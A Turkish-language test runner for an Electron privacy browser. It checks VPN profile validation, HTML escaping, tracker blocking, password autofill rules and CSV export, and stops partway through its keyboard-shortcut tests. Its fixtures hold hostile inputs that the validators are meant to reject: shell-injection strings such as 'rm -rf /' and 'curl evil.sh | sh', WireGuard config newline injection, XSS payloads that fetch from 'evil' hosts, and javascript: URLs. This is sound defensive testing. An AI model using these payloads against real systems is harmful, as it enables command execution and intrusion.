/**
 * İlgezdi — Bağımlılıksız test koşucusu
 *
 *   npm test
 *
 * Neden böyle: projede test altyapısı yoktu ve bu denetimde bulunan hataların
 * önemli bir kısmı (IPC kanal adı uyuşmazlığı, bağlanmamış ayarlar, doğrulanmayan
 * profil alanları) tam olarak testin yakalayacağı türdendi. Yeni bir bağımlılık
 * eklemeden, `node test/run.js` ile çalışan en küçük düzenek.
 *
 * Testler Electron'a ihtiyaç duymaz: `electron` modülü sahte bir nesneyle
 * değiştirilir, böylece saf mantık (doğrulama, ayrıştırma) düz Node'da koşar.
 */

'use strict';

const path = require('path');
const Module = require('module');

// ─── Sahte `electron` modülü ──────────────────────────────────────────────────
// Ana süreç modülleri `require('electron')` yapıyor. Testte gerçek Electron
// yok; doğrulama/ayrıştırma mantığını izole etmek için yerine bunu koyuyoruz.
const fakeElectron = {
  // Eşzamansız API (os-crypto.js); testte şifreleme kullanılamıyor sayılır.
  safeStorage: {
    isAsyncEncryptionAvailable: async () => false,
    encryptStringAsync: async (s) => Buffer.from('fake:' + s, 'utf8'),
    decryptStringAsync: async (b) => ({ result: String(b).replace(/^fake:/, ''), shouldReEncrypt: false }),
  },
  dialog:  { showOpenDialog: async () => ({ canceled: true, filePaths: [] }) },
  app:     { getPath: () => path.join(__dirname, '.tmp'), getVersion: () => '0.0.0-test', isPackaged: false },
  ipcMain: { handle: () => {}, on: () => {} },
  net:     {},
};
const origLoad = Module._load;
Module._load = function (request, parent, isMain) {
  if (request === 'electron') return fakeElectron;
  return origLoad.apply(this, arguments);
};

// ─── Minik test çatısı ────────────────────────────────────────────────────────
let passed = 0;
let failed = 0;
const failures = [];
let currentSuite = '';

function suite(name) {
  currentSuite = name;
  console.log('\n\x1b[1m' + name + '\x1b[0m');
}

function check(name, ok, detail) {
  if (ok) {
    passed++;
    console.log('  \x1b[32m✓\x1b[0m ' + name);
  } else {
    failed++;
    failures.push(currentSuite + ' → ' + name + (detail ? '  (' + detail + ')' : ''));
    console.log('  \x1b[31m✗ ' + name + '\x1b[0m' + (detail ? '  ' + detail : ''));
  }
}

const eq = (name, actual, expected) =>
  check(name, JSON.stringify(actual) === JSON.stringify(expected),
    'beklenen ' + JSON.stringify(expected) + ', gelen ' + JSON.stringify(actual));

// ══════════════════════════════════════════════════════════════════════════════
// K-02 / K-03 — VPN profil doğrulama (komut ve yapılandırma enjeksiyonu sınırı)
// ══════════════════════════════════════════════════════════════════════════════
const { _internals: vpn } = require('../src/main/vpn-manager.js');
const { parseEndpoint, validateProfileInput, isIpv4, isAddrCidr, isDnsList, cleanLabel } = vpn;

const KEY = 'A'.repeat(43) + '=';   // 44 karakterlik geçerli base64 WireGuard anahtarı
const baseProfile = () => ({
  endpoint: '1.2.3.4:51820', publicKey: KEY, privateKey: KEY,
  clientIp: '10.8.0.2/32', dns: '1.1.1.1',
});

suite('K-02 — Kabuk komutu enjeksiyonu endpoint sınırında durmalı');
[
  '1.2.3.4 & calc.exe',
  '1.2.3.4:51820 && powershell -enc AAA',
  '1.2.3.4:51820 | whoami',
  '1.2.3.4:51820; rm -rf /',
  '$(curl evil.sh):51820',
  '`whoami`:51820',
  '-n 100 1.2.3.4',            // ping argümanı olarak sızma denemesi
  '1.2.3.4:51820\nPostUp = sh',
  '1.2.3.4:51820\r\nfoo',
  '../../etc/passwd:51820',
  '',
].forEach((payload) => {
  check('reddedildi: ' + JSON.stringify(payload), parseEndpoint(payload) === null);
});

suite('K-03 — Satır sonu enjeksiyonu .conf yazılmadan önce durmalı');
[
  ['dns',       '1.1.1.1\nPostUp = /bin/sh -c "curl evil.sh | sh"'],
  ['dns',       '1.1.1.1\r\nPostUp = calc.exe'],
  ['clientIp',  '10.8.0.2/32\nPostUp = whoami'],
  ['publicKey', 'A'.repeat(42) + '\nx'],
  ['privateKey', 'A'.repeat(42) + '\nPostUp = x'],
].forEach(([field, value]) => {
  const p = baseProfile();
  p[field] = value;
  check('reddedildi: ' + field + ' içinde satır sonu', validateProfileInput(p) !== null);
});

suite('Meşru profiller kabul edilmeli (yanlış pozitif olmamalı)');
[
  { endpoint: '1.2.3.4:51820',            clientIp: '10.8.0.2/32', dns: '1.1.1.1' },
  { endpoint: 'vpn.ornek.com.tr:51820',   clientIp: '10.8.0.2/32', dns: '1.1.1.1, 1.0.0.1' },
  { endpoint: '[2001:db8::1]:51820',      clientIp: '10.8.0.2/32', dns: '9.9.9.9' },
  { endpoint: 'a-b.sunucu-1.example:1',   clientIp: '192.168.1.5', dns: '8.8.8.8' },
  { endpoint: 'tr1.vpn.example.com:2408', clientIp: 'fd00::2/128', dns: '2606:4700:4700::1111' },
].forEach((c) => {
  const err = validateProfileInput({ ...c, publicKey: KEY, privateKey: KEY });
  check('kabul edildi: ' + c.endpoint, err === null, err || '');
});

suite('Endpoint ayrıştırma doğruluğu');
eq('host/port',        parseEndpoint('vpn.x.com:51820'), { host: 'vpn.x.com', port: 51820 });
eq('IPv6 köşeli',      parseEndpoint('[2001:db8::1]:443'), { host: '2001:db8::1', port: 443 });
check('port > 65535 reddedilir', parseEndpoint('1.2.3.4:99999') === null);
check('port 0 reddedilir',       parseEndpoint('1.2.3.4:0') === null);
check('portsuz reddedilir',      parseEndpoint('1.2.3.4') === null);
check('geçersiz IP oktedi reddedilir', parseEndpoint('1.2.3.999:51820') === null);

suite('Alan doğrulayıcıları');
check('isIpv4 doğru',            isIpv4('10.0.0.1') && !isIpv4('10.0.0.256') && !isIpv4('10.0.0'));
check('isAddrCidr doğru',        isAddrCidr('10.8.0.2/32') && isAddrCidr('10.8.0.2') && !isAddrCidr('10.8.0.2/999'));
check('isDnsList doğru',         isDnsList('1.1.1.1') && isDnsList('1.1.1.1, 8.8.8.8') && !isDnsList('1.1.1.1; calc'));
check('cleanLabel kontrol karakteri siler', cleanLabel('Sunucu\n\x00Adı') === 'SunucuAdı');
check('cleanLabel uzunluk sınırlar',        cleanLabel('x'.repeat(500)).length === 60);
check('private key zorunlu',     validateProfileInput({ ...baseProfile(), publicKey: 'kısa' }) !== null);

// ══════════════════════════════════════════════════════════════════════════════
// Ayrıştırıcılar — içe aktarma yolları (dış kaynaklı veri)
// ══════════════════════════════════════════════════════════════════════════════
const { _internals: pw } = require('../src/main/password-manager.js');

suite('CSV parolası ayrıştırma');
eq('başlık sırası serbest, tırnak işlenir',
  pw.parseCsvPasswords('name,url,username,password\n"Ornek","https://a.com","u1","p,1"'),
  [{ url: 'https://a.com', username: 'u1', password: 'p,1' }]);
eq('url/password yoksa boş döner', pw.parseCsvPasswords('foo,bar\n1,2'), []);
eq('boş girdi boş döner',          pw.parseCsvPasswords(''), []);

// ══════════════════════════════════════════════════════════════════════════════
// IPC sözleşmesi — preload'ın açtığı yüzey ile arayüzün kullandığı eşleşmeli
// ══════════════════════════════════════════════════════════════════════════════
const fs = require('fs');
const SRC = path.join(__dirname, '..', 'src');
const read = (p) => fs.readFileSync(path.join(SRC, p), 'utf8');

suite('IPC sözleşmesi');
{
  const mainFiles = fs.readdirSync(path.join(SRC, 'main')).filter((f) => f.endsWith('.js'));
  const mainSrc = mainFiles.map((f) => read('main/' + f)).join('\n');
  const preSrc = read('preload/preload.js') + read('preload/popup-preload.js') + read('preload/page-preload.js');

  const handlers = new Set();
  for (const m of mainSrc.matchAll(/ipcMain\.(?:handle|on)\(\s*['"`]([^'"`]+)/g)) handlers.add(m[1]);
  const invoked = new Set();
  for (const m of preSrc.matchAll(/ipcRenderer\.(?:invoke|send)\(\s*['"`]([^'"`]+)/g)) invoked.add(m[1]);

  const orphanInvokes = [...invoked].filter((c) => !handlers.has(c));
  const unusedHandlers = [...handlers].filter((c) => !invoked.has(c));
  check("preload'un çağırdığı her kanalın ana süreçte işleyicisi var",
    orphanInvokes.length === 0, orphanInvokes.join(', '));
  check("ana süreçteki her işleyici preload'dan çağrılıyor",
    unusedHandlers.length === 0, unusedHandlers.join(', '));

  // Arayüzün kullandığı preload anahtarları gerçekten açılmış mı?
  // (Bu test, engelleyici istatistiklerini ölü bırakan `onBlockStats` hatasını
  //  yakalayan testtir — o hata aylarca fark edilmedi.)
  const exposedKeys = new Set();
  for (const m of preSrc.matchAll(/^\s{2,4}([a-zA-Z]+)\s*:/gm)) exposedKeys.add(m[1]);

  const rendererFiles = fs.readdirSync(path.join(SRC, 'renderer')).filter((f) => f.endsWith('.js'));
  const missing = new Map();
  for (const f of rendererFiles) {
    const s = read('renderer/' + f);
    for (const m of s.matchAll(/(?:secureBrowser|\bsb)\s*\??\.\s*([a-zA-Z]+)\s*\??\s*[.(]/g)) {
      if (!exposedKeys.has(m[1]) && !missing.has(m[1])) missing.set(m[1], f);
    }
  }
  check('arayüzün kullandığı her preload anahtarı açılmış',
    missing.size === 0,
    [...missing].map(([k, f]) => k + ' (' + f + ')').join(', '));
}

// ══════════════════════════════════════════════════════════════════════════════
// Derleme yapılandırması — yayını sessizce bozan hatalar
// ══════════════════════════════════════════════════════════════════════════════
suite('Derleme yapılandırması');
{
  const pkgRaw = fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8');
  const pkg = JSON.parse(pkgRaw);

  // publish=null olursa electron-builder app-update.yml üretmez ve
  // otomatik güncelleme yayınlanan derlemede sessizce ölür.
  check('build.publish tanımlı (otomatik güncelleme için zorunlu)',
    Array.isArray(pkg.build.publish) && pkg.build.publish.length > 0 &&
    pkg.build.publish[0].provider === 'github');

  // JSON'da yinelenen anahtar sessizce son değeri kazandırır — bu hata tam
  // olarak böyle oluştu. Ham metinde `build` bloğundaki tekrarları ara.
  const dupPublish = (pkgRaw.match(/^\s*"publish"\s*:/gm) || []).length;
  check('package.json içinde tek bir "publish" anahtarı var', dupPublish === 1,
    dupPublish + ' tane bulundu');
}

// ══════════════════════════════════════════════════════════════════════════════
// Tanılama — kimliksizleştirme sınırı
// Bu testler kritik: scrub() çalışmazsa tanılama altyapısı bir tarama geçmişi
// sızıntı kanalına dönüşür.
// ══════════════════════════════════════════════════════════════════════════════
const diagMod = require('../src/main/diagnostics.js');
diagMod._setSaltForTest('test-salt-sabit');
const { scrub, redactUrl, hmacTag } = diagMod._internals;

suite('Tanılama — URL kimliksizleştirme');
{
  const r = redactUrl('https://gizli-banka.com.tr/hesap/12345?token=abc');
  check('tam URL korunmuyor', !r.includes('gizli-banka'), r);
  check('sorgu dizesi korunmuyor', !r.includes('token') && !r.includes('abc'), r);
  check('yol içeriği korunmuyor', !r.includes('12345'), r);
  check('şema korunuyor (teşhis için gerekli)', r.startsWith('https://'), r);
  check('karma etiket var', /#[0-9a-f]{8}/.test(r), r);

  // Aynı host → aynı etiket (korelasyon kurulabilir)
  eq('aynı host aynı etiketi alır',
    redactUrl('https://ornek.com/a') === redactUrl('https://ornek.com/b'), true);
  // Farklı host → farklı etiket
  check('farklı host farklı etiket alır',
    redactUrl('https://a.com/') !== redactUrl('https://b.com/'));
  // Etiket geri çevrilemez (32 hex değil, 8 hex kısaltma; kaba kuvvete de tuz engel)
  check('etiket host adını içermiyor', !redactUrl('https://a.com/').includes('a.com'));
}

// Ters bölü, kabuk/heredoc katmanlarında sessizce tek bölüye inip JS'te
// bilinmeyen kaçış olarak yok olabiliyor. Karakter kodundan üretmek bu
// kırılganlığı tamamen ortadan kaldırır.
const BS = String.fromCharCode(92);

suite('Tanılama — serbest metin temizleme');
{
  const winPath = 'C:' + BS + 'Users' + BS + 'BurakAkmese' + BS + 'AppData' + BS + 'config.json';
  const cases = [
    ['yığın izindeki URL',      'at fetch (https://banka.com/giris:12)', 'banka.com'],
    ['e-posta',                 'kullanici burak@ornek.com giriş yaptı', 'burak@ornek.com'],
    ['JWT',                     'token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcdefghijk', 'eyJhbGciOiJIUzI1NiJ9'],
    ['uzun hex (anahtar)',      'key=' + 'a1b2c3d4'.repeat(8), 'a1b2c3d4a1b2c3d4'],
    ['IP adresi',               'bağlantı 88.245.12.33 üzerinden', '88.245.12.33'],
    ['Windows kullanıcı yolu',  winPath, 'BurakAkmese'],
    ['Unix kullanıcı yolu',     '/home/burak/.config/ilgezdi', '/home/burak'],
  ];
  for (const [name, input, secret] of cases) {
    const out = scrub(input);
    check(name + ' temizlendi', !out.includes(secret), 'çıktı: ' + out);
  }

  check('127.0.0.1 korunur (teşhis için zararsız)', scrub('sunucu 127.0.0.1:3000').includes('127.0.0.1'));
  check('boş girdi çökmez', scrub(null) === '' && scrub(undefined) === '');
  check('çok uzun metin kısaltılır', scrub('x'.repeat(9000)).length < 4100);
  check('hata mesajının kendisi korunur',
    scrub('TypeError: cannot read properties of undefined').includes('TypeError'));
}

suite('Tanılama — rapor zarfı kişisel veri içermiyor');
{
  // buildReport env/features üretir; ziyaret geçmişine ait alan OLMAMALI.
  const rep = diagMod._internals.buildReport('test', 'kullanıcı notu burak@x.com');
  const json = JSON.stringify(rep);
  check('kullanıcı notundaki e-posta temizlenmiş', !json.includes('burak@x.com'), json.slice(0, 200));
  check('zarf sürüm bilgisi taşıyor', 'env' in rep && 'features' in rep);
  check('breadcrumbs dizi', Array.isArray(rep.breadcrumbs));
  const forbidden = ['visitHistory', 'cookies', 'passwords', 'vault', 'authSession'];
  check('yasaklı alan yok', !forbidden.some((k) => json.includes(k)));
}

// ══════════════════════════════════════════════════════════════════════════════
// Y-04 / Y-05 — HTML kaçış yardımcısı (dış kaynaklı veri → innerHTML sınırı)
// ══════════════════════════════════════════════════════════════════════════════
const H = require('../src/renderer/html-safe.js');

suite('HTML kaçışı — sayfa başlığı enjeksiyonu');
{
  const payloads = [
    '<img src=x onerror=alert(1)>',
    '<script>fetch("//evil")</script>',
    '"><svg onload=alert(1)>',
    "' onmouseover='alert(1)",
    '<style>*{background:url(//evil/x)}</style>',
    '<base href="https://evil/">',
    '`${alert(1)}`',
  ];
  for (const p of payloads) {
    const out = H.esc(p);
    check('etiket/tırnak nötrlendi: ' + p.slice(0, 34), !/[<>"'`]/.test(out), out);
  }
  eq('normal metin korunur', H.esc('İlgezdi — Göktürk & Türk'), 'İlgezdi — Göktürk &amp; Türk');
  eq('null güvenli', H.esc(null), '');
  eq('sayı metne döner', H.esc(42), '42');
}

suite('URL beyaz listesi — href/src sınırı');
{
  eq('https geçer',                      H.safeUrl('https://a.com/x'), 'https://a.com/x');
  eq('http geçer',                       H.safeUrl('http://a.com'), 'http://a.com');
  eq('javascript: reddedilir',           H.safeUrl('javascript:alert(1)'), '');
  eq('karışık harfli JaVaScRiPt: reddedilir', H.safeUrl('JaVaScRiPt:alert(1)'), '');
  eq('baştaki boşlukla gizlenmiş javascript: reddedilir', H.safeUrl('   javascript:alert(1)'), '');
  eq('data:text/html reddedilir (izinle bile)', H.safeUrl('data:text/html,<script>x</script>', { allowData: true }), '');
  eq('data:image yalnızca izinle geçer', H.safeUrl('data:image/png;base64,AAA', { allowData: true }), 'data:image/png;base64,AAA');
  eq('data:image izinsiz reddedilir',    H.safeUrl('data:image/png;base64,AAA'), '');
  eq('file: reddedilir',                 H.safeUrl('file:///C:/Windows/win.ini'), '');
  eq('vbscript: reddedilir',             H.safeUrl('vbscript:msgbox(1)'), '');
  eq('baştaki kontrol karakterleriyle gizlenmiş javascript: reddedilir',
     H.safeUrl(String.fromCharCode(1, 2, 31) + 'javascript:alert(1)'), '');
}

// ══════════════════════════════════════════════════════════════════════════════
// Y-06 / Y-07 — VPN durumu dürüst mü?
// ══════════════════════════════════════════════════════════════════════════════
suite('VPN durumu — kill switch yalnızca doğrulanmış bağlantıda');
{
  const { VpnManager } = require('../src/main/vpn-manager.js');
  const tmp = fs.mkdtempSync(path.join(require('os').tmpdir(), 'ilg-vpn-test-'));
  const m = new VpnManager(tmp);

  const s0 = m.getStatus();
  check('bağlı değilken kill switch "Aktif" DEĞİL', s0.killSwitch === false);
  check('platform desteği açıkça bildiriliyor', typeof s0.killSwitchSupported === 'boolean');
  check('yalnızca Windows destekli bildiriliyor',
    s0.killSwitchSupported === (process.platform === 'win32'));

  // Doğrulanmış bağlı durumu simüle et
  m.status = 'connected';
  m.activeProfile = { id: 'x', name: 'test', endpoint: '1.2.3.4:51820', privateKey: 'enc:gizli' };
  const s1 = m.getStatus();
  check('bağlıyken kill switch = platform desteği',
    s1.killSwitch === (process.platform === 'win32'));
  check('getStatus private key sızdırmıyor', s1.activeProfile.privateKey === '••••••••');

  // Kopma
  m.status = 'dropped';
  m.activeProfile = null;
  check('koptuğunda kill switch "Aktif" DEĞİL', m.getStatus().killSwitch === false);

  check('eski sahte kill switch metotları kaldırıldı',
    typeof m.enableKillSwitch === 'undefined' && typeof m.disableKillSwitch === 'undefined');
  check('DNS testi artık yöneticinin metodu (VPN durumunu bilmesi için)',
    typeof m.testDnsLeak === 'function');

  try { fs.rmSync(tmp, { recursive: true, force: true }); } catch {}
}

// ══════════════════════════════════════════════════════════════════════════════
// O-08 / O-09 — Engelleyici: meşru siteleri bozmamalı, gerçek izleyicileri yakalamalı
// ══════════════════════════════════════════════════════════════════════════════
const blocker = require('../src/main/blocker-main.js');

suite('Engelleyici — varsayılan seviyede yanlış pozitif yok');
{
  blocker._resetForTest();
  const page = 'https://magaza.example.com/';
  const B = (url) => blocker.shouldBlockUrl(url, { resourceType: 'script', pageUrl: page });

  check('Shopify /collections/ ENGELLENMEZ (eskiden /\\/collect/ ile engelleniyordu)',
    !B('https://magaza.example.com/collections/ayakkabi'));
  check('GitHub /sponsors ENGELLENMEZ', !B('https://github.com/sponsors/biri'));
  check('meşru /banner.jpg ENGELLENMEZ', !B('https://site.com/img/banner.jpg'));
  check('meşru /popup-menu.js ENGELLENMEZ', !B('https://site.com/js/popup-menu.js'));
  check('doubleclick.net ENGELLENİR', B('https://ad.doubleclick.net/x.js'));
  check('google-analytics alt alanı ENGELLENİR', B('https://ssl.google-analytics.com/ga.js'));
  check('facebook.com/tr pikseli ENGELLENİR (eskiden hiç eşleşmiyordu)',
    B('https://www.facebook.com/tr?id=1&ev=PageView'));
  check('facebook.com normal sayfası ENGELLENMEZ', !B('https://www.facebook.com/haberler'));
  check('alt dize tuzağı: notdoubleclick.net.example.com ENGELLENMEZ',
    !B('https://notdoubleclick.net.example.com/x.js'));
  check('ana çerçeve gezinmesi ASLA engellenmez',
    !blocker.shouldBlockUrl('https://doubleclick.net/', { resourceType: 'mainFrame' }));
  check('data: ENGELLENMEZ', !B('data:image/png;base64,AAA'));
}

suite('Engelleyici — seviyeler, üçüncü taraf, beyaz liste');
{
  blocker._resetForTest();
  const page = 'https://haber.com.tr/';
  const B = (url) => blocker.shouldBlockUrl(url, { resourceType: 'script', pageUrl: page });

  check('medium: yol deseni uygulanmaz (yalnızca alan adı listesi)', !B('https://cdn.site.com/gtag/js?id=1'));
  blocker.updateBlockerConfig({ level: 'high' });
  check('high: /gtag/js ENGELLENİR', B('https://cdn.site.com/gtag/js?id=1'));
  check('high: GA /g/collect? uç noktası ENGELLENİR', B('https://cdn.site.com/g/collect?v=2'));
  check('high: /collections/ yine ENGELLENMEZ', !B('https://haber.com.tr/collections/x'));

  blocker.updateBlockerConfig({ level: 'full' });
  check('full: üçüncü taraf kaynak ENGELLENİR (eskiden hiç uygulanmamıştı)', B('https://cdn.baskasi.net/lib.js'));
  check('full: aynı sitenin alt alanı ENGELLENMEZ', !B('https://static.haber.com.tr/app.js'));
  check('full: sayfa bilinmiyorsa izin verilir (siteyi bozma)',
    !blocker.shouldBlockUrl('https://cdn.baskasi.net/lib.js', { resourceType: 'script' }));

  blocker.updateBlockerConfig({ level: 'medium', whitelist: ['https://www.haber.com.tr/yol'] });
  check('beyaz liste: sayfa izinliyse o sayfanın izleyicisi de ENGELLENMEZ',
    !B('https://www.google-analytics.com/analytics.js'));
  check('beyaz liste: başka sayfada aynı izleyici ENGELLENİR',
    blocker.shouldBlockUrl('https://www.google-analytics.com/analytics.js', { resourceType: 'script', pageUrl: 'https://baska.com/' }));

  blocker.updateBlockerConfig({ level: 'olmayan-seviye' });
  eq('geçersiz seviye yok sayılır', blocker.getBlockStats().level, 'medium');

  const rd = blocker._internals.registrableDomain;
  eq('kayıtlı alan adı: com.tr', rd('static.haber.com.tr'), 'haber.com.tr');
  eq('kayıtlı alan adı: co.uk',  rd('a.b.bbc.co.uk'), 'bbc.co.uk');
  eq('kayıtlı alan adı: com',    rd('cdn.example.com'), 'example.com');
  blocker._resetForTest();
}

// ══════════════════════════════════════════════════════════════════════════════
// Y-11 / O-02 — Şifre kasası
// ══════════════════════════════════════════════════════════════════════════════
suite('Otomatik doldurma — origin kuralları');
{
  const pwm = require('../src/main/password-manager.js');
  pwm._internals._setVaultForTest([
    { id: '1', url: 'https://banka.com.tr/giris',   username: 'u1', password: 'p1' },
    { id: '2', url: 'http://eski-site.com/',        username: 'u2', password: 'p2' },
    { id: '3', url: 'https://panel.site.com:8443/', username: 'u3', password: 'p3' },
  ]);
  check('aynı https origin doldurulur', pwm.getForOrigin('https://banka.com.tr/hesap').length === 1);
  check('www farkı önemsiz', pwm.getForOrigin('https://www.banka.com.tr/').length === 1);
  check('HTTPS kimliği HTTP sayfasına ASLA doldurulmaz (MITM)', pwm.getForOrigin('http://banka.com.tr/giris').length === 0);
  check('HTTP kimliği HTTPS sayfasına doldurulabilir (yükseltme güvenli)', pwm.getForOrigin('https://eski-site.com/').length === 1);
  check('farklı port = farklı origin', pwm.getForOrigin('https://panel.site.com/').length === 0);
  check('aynı port eşleşir', pwm.getForOrigin('https://panel.site.com:8443/x').length === 1);
  check('benzer alan adı eşleşmez (alt dize tuzağı)', pwm.getForOrigin('https://banka.com.tr.saldirgan.com/').length === 0);
  check('javascript: sayfası boş döner', pwm.getForOrigin('javascript:alert(1)').length === 0);
  pwm._internals._setVaultForTest([]);
}

suite('Şifre kasası — yardımcılar');
{
  const I = require('../src/main/password-manager.js')._internals;
  eq('şemasız site https varsayılır (elle eklenenin doldurulabilmesi için şart)',
    I.normalizeSiteUrl('google.com'), 'https://google.com/');
  eq('yol korunur', I.normalizeSiteUrl('https://a.com/giris'), 'https://a.com/giris');
  eq('javascript: reddedilir', I.normalizeSiteUrl('javascript:alert(1)'), '');
  eq('boş reddedilir', I.normalizeSiteUrl('   '), '');
  eq('v10 → aes',                     I.blobKind(Buffer.from('v10' + 'x'.repeat(40))), 'aes');
  eq('v20 → app-bound (Chrome 127+)', I.blobKind(Buffer.from('v20' + 'x'.repeat(40))), 'app-bound');
  eq('önek yok → eski dpapi',         I.blobKind(Buffer.from([1, 0, 0, 0, 208, 140, 157])), 'dpapi');
  eq('boş → empty',                   I.blobKind(Buffer.alloc(0)), 'empty');
  eq('v20 blob için PowerShell çağrılmadan boş döner', I.decryptPassword(Buffer.from('v20abc'), null), '');
}

// ══════════════════════════════════════════════════════════════════════════════
// O-11 — CSV formül enjeksiyonu
// ══════════════════════════════════════════════════════════════════════════════
suite('CSV dışa aktarma — formül enjeksiyonu ve alan kaçışı');
{
  const { SecureLogManager } = require('../src/main/secure-log-manager.js');
  const c = SecureLogManager.csvCell;
  const Q = String.fromCharCode(39); // '
  check('= ile başlayan başlık metne çevrilir', c('=HYPERLINK("x")').startsWith('"' + Q + '='));
  check('+ nötrlenir', c('+cmd').startsWith('"' + Q + '+'));
  check('- nötrlenir', c('-2+3').startsWith('"' + Q + '-'));
  check('@ nötrlenir', c('@SUM(A1)').startsWith('"' + Q + '@'));
  eq('virgüllü URL tek hücrede kalır', c('https://a.com/?x=1,2'), '"https://a.com/?x=1,2"');
  eq('tırnak ikilenir (RFC 4180)', c('a"b'), '"a""b"');
  eq('normal metin korunur', c('İlgezdi'), '"İlgezdi"');
  eq('null boş hücre', c(null), '""');
}

// ══════════════════════════════════════════════════════════════════════════════
// K-01 — Electron 44: kaldırılmış / kullanımdan kaldırılmış API geri gelmemeli
// ══════════════════════════════════════════════════════════════════════════════
suite('Electron 44 — kullanımdan kaldırılmış ya da belgelenmemiş API yok');
{
  const files = fs.readdirSync(path.join(SRC, 'main')).filter((f) => f.endsWith('.js')).map((f) => 'main/' + f)
    .concat(['preload/preload.js', 'preload/popup-preload.js']);
  // Yorum satırları hariç: açıklamalarda eski API adlarının geçmesi serbest.
  const code = files.map((f) => read(f).split('\n')
    .filter((l) => !/^\s*(\/\/|\*|\/\*)/.test(l)).join('\n')).join('\n');

  const banned = [
    ['BrowserView (30+ → WebContentsView)',                     /\bnew BrowserView\b|\b(add|remove|set|get|setTop)BrowserViews?\(|fromBrowserView\(/],
    ['webContents.destroy() (belgelenmemiş → close())',         /webContents\.destroy\(\)/],
    ['webContents.goBack/canGoBack… (32+ → navigationHistory)', /webContents\.(canGoBack|goBack|canGoForward|goForward|goToIndex|goToOffset|canGoToOffset|clearHistory)\(/],
    ["'crashed' olayları (29'da kaldırıldı)",                   /\.on\(\s*['"](crashed|renderer-process-crashed|gpu-process-crashed|plugin-crashed)['"]/],
    ['setAutoResize (yalnızca BrowserView)',                    /\.setAutoResize\(/],
    ['boş webRequest urls filtresi (35+ davranışı değişti)',    /urls:\s*\[\s*\]/],
  ];
  for (const [name, re] of banned) {
    const hit = code.match(re);
    check('kullanılmıyor: ' + name, !hit, hit && hit[0]);
  }

  check('Electron 45 hazırlığı: ekran paylaşımı izni (display-capture) ele alınıyor',
    /'display-capture'/.test(read('main/main.js')));
}

// ══════════════════════════════════════════════════════════════════════════════
// Yayın hattı — CI'daki Node, paketleme araçlarının gereksinimini karşılamalı
// ══════════════════════════════════════════════════════════════════════════════
suite('Yayın hattı — CI Node sürümü araç gereksinimlerini karşılıyor');
{
  const wf = fs.readFileSync(path.join(__dirname, '..', '.github', 'workflows', 'release.yml'), 'utf8');
  const m = wf.match(/^\s*node-version:\s*['"]?(\d+)/m);
  const ciMajor = m ? Number(m[1]) : 0;

  // Electron 44 / electron-builder 26 ile gelen araçların beyan ettiği en düşük Node.
  // (Bu kontrol, CI Node 20'de kalıp yayın derlemesinin sessizce kırılmasını yakalar.)
  const minMajorOf = (pkg) => {
    try {
      const e = require(path.join(__dirname, '..', 'node_modules', pkg, 'package.json')).engines;
      const mm = e && String(e.node || '').match(/(\d+)/);
      return mm ? Number(mm[1]) : 0;
    } catch { return 0; }
  };
  const required = Math.max(minMajorOf('@electron/rebuild'), minMajorOf('electron'), minMajorOf('electron-builder'));

  check('release.yml içinde node-version bulundu', ciMajor > 0, m && m[0]);
  check('CI Node (' + ciMajor + ') ≥ araçların istediği (' + required + ')', ciMajor >= required,
    { ciMajor, required });
}

// ══════════════════════════════════════════════════════════════════════════════
// Tarayıcı komutları — kısayollar, sağ tık menüsü, yakınlaştırma, kapatılan sekmeler
// (karşılaştırma raporu P0 maddeleri)
// ══════════════════════════════════════════════════════════════════════════════
const bc = require('../src/main/browser-commands.js');

suite('Kısayollar — odak sayfadayken de çalışır');
{
  const key = (k, mods = {}, extra = {}) => ({
    type: 'keyDown', key: k, code: extra.code || '', control: !!mods.ctrl, shift: !!mods.shift,
    alt: !!mods.alt, meta: !!mods.meta, isAutoRepeat: !!extra.repeat, isComposing: false,
  });
  const win = (input, surface = 'page') => bc.commandForInput(input, { platform: 'win32', surface });

  eq('Ctrl+T → yeni sekme', win(key('t', { ctrl: true })), 'new-tab');
  eq('Caps Lock açıkken Ctrl+T', win(key('T', { ctrl: true })), 'new-tab');
  eq('Ctrl+Shift+T → kapatılan sekmeyi aç', win(key('T', { ctrl: true, shift: true })), 'reopen-closed-tab');
  eq('Ctrl+W', win(key('w', { ctrl: true })), 'close-tab');
  eq('Ctrl+Tab / Ctrl+Shift+Tab', [win(key('Tab', { ctrl: true })), win(key('Tab', { ctrl: true, shift: true }))], ['next-tab', 'prev-tab']);
  eq('Ctrl+3 ve Ctrl+9', [win(key('3', { ctrl: true }, { code: 'Digit3' })), win(key('9', { ctrl: true }, { code: 'Digit9' }))], ['tab-3', 'last-tab']);
  eq('AZERTY: Ctrl+1 tuşu "&" üretse de 1. sekme', win(key('&', { ctrl: true }, { code: 'Digit1' })), 'tab-1');
  eq('Türkçe Q: Ctrl+Shift+3 ("^") sekme değiştirmez', win(key('^', { ctrl: true, shift: true }, { code: 'Digit3' })), null);
  eq('F5, Ctrl+R, Ctrl+F5', [win(key('F5')), win(key('r', { ctrl: true })), win(key('F5', { ctrl: true }))], ['reload', 'reload', 'hard-reload']);
  eq('Alt+Sol / Alt+Sağ', [win(key('ArrowLeft', { alt: true })), win(key('ArrowRight', { alt: true }))], ['back', 'forward']);
  eq('Ctrl+F, F3, Shift+F3', [win(key('f', { ctrl: true })), win(key('F3')), win(key('F3', { shift: true }))], ['find', 'find-next', 'find-prev']);
  eq('Ctrl+L, Alt+D, F6', [win(key('l', { ctrl: true })), win(key('d', { alt: true })), win(key('F6'))], ['focus-address', 'focus-address', 'focus-address']);
  eq('Yakınlaştır: Ctrl+=, ABD Ctrl+Shift+=, Türkçe Q Ctrl+Shift+4, sayısal takım',
    [win(key('=', { ctrl: true })), win(key('+', { ctrl: true, shift: true })),
     win(key('+', { ctrl: true, shift: true }, { code: 'Digit4' })), win(key('+', { ctrl: true }, { code: 'NumpadAdd' }))],
    ['zoom-in', 'zoom-in', 'zoom-in', 'zoom-in']);
  eq('Ctrl+- ve Ctrl+0', [win(key('-', { ctrl: true })), win(key('0', { ctrl: true }, { code: 'Digit0' }))], ['zoom-out', 'zoom-reset']);
  eq('Ctrl+P ve Ctrl+D', [win(key('p', { ctrl: true })), win(key('d', { ctrl: true }))], ['print', 'bookmark-page']);

  eq('AltGr (Ctrl+Alt) ile yazılan karakter yakalanmaz — Türkçe klavyede @', win(key('q', { ctrl: true, alt: true })), null);
  eq('AltGr+T bile yakalanmaz', win(key('t', { ctrl: true, alt: true })), null);
  eq('Shift+T (büyük harf yazmak) kısayol değil', win(key('T', { shift: true })), null);
